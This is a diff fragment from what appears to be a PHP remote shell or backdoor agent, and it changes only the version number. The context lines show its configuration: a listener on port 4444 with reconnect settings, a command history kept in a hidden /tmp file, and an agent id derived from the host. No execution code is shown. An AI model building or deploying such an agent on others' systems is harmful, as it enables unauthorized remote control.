@@ -18,7 +18,7 @@ if(defined('PHP_MAJOR_VERSION')&&PHP_MAJOR_VERSION==5&&PHP_MINOR_VERSION<4){
 // =============================================
 $CFG=array('host'=>'0.0.0.0','port'=>4444,'http_port'=>8888,
     'reconnect'=>5,'timeout'=>30,'hist_file'=>'/tmp/.ph_'.substr(md5(__FILE__),0,8),
-    'hist_max'=>500,'version'=>'5.0','mode'=>'FULL','protocol'=>'auto','agent_id'=>'php-'.substr(md5(php_uname('n').getmypid()),0,8));
+    'hist_max'=>500,'version'=>'5.2','mode'=>'FULL','protocol'=>'auto','agent_id'=>'php-'.substr(md5(php_uname('n').getmypid()),0,8));
 $G=array('sock'=>null,'history'=>array(),'hist_idx'=>0,'jobs'=>array(),'job_cnt'=>0,'caps'=>array(),
     'session_id'=>null,'proto'=>'plaintext','seq'=>0);
 
